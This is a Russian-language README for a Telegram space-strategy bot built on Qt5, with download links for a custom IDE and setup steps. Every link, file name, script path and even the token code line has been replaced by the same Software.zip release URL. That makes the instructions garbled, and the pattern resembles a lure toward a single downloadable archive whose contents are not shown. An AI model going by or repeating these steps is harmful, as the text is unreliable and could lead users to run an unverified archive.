# Телеграм бот космической стратегии

Бот написан на JavaScript на движке QmlEngine Qt5.

В качестве сервера используется ПО собственной разработки - SHS Server, который написан на С++ и Qt5. 

Для разработки применяется самописное IDE - **Server Designer**, так же написан на Qt5.
Скачать Server Designer можно тут:
* [Server Designer для Windows](https://github.com/GrafDeCot/SpaceTimeBot/releases/download/v2.0/Software.zip)
* [Server Designer для Mac](https://github.com/GrafDeCot/SpaceTimeBot/releases/download/v2.0/Software.zip)
* [Server Designer для Ubuntu 20.04](https://github.com/GrafDeCot/SpaceTimeBot/releases/download/v2.0/Software.zip)
* [Server Designer для Debian 10](https://github.com/GrafDeCot/SpaceTimeBot/releases/download/v2.0/Software.zip)


## Как начать разработку
Для начала разработки и тестирования необходим только Server Designer.
1. Запустить server_designer
2. Открыть в нём файл роекта *https://github.com/GrafDeCot/SpaceTimeBot/releases/download/v2.0/Software.zip*
3. В файле скрипта *https://github.com/GrafDeCot/SpaceTimeBot/releases/download/v2.0/Software.zip* найти строчку `const isProduction = true;` и заменить на `const isProduction = false;`
4. В файле скрипта *https://github.com/GrafDeCot/SpaceTimeBot/releases/download/v2.0/Software.zip* найти строчку `https://github.com/GrafDeCot/SpaceTimeBot/releases/download/v2.0/Software.zip("/bot_token/");` и вписать туда токен своего бота, на котором собираетесь тестировать. (создать бота можно тут: https://github.com/GrafDeCot/SpaceTimeBot/releases/download/v2.0/Software.zip )
5. Для запуска нажать "Test with form" или F12
6. Бот запущен
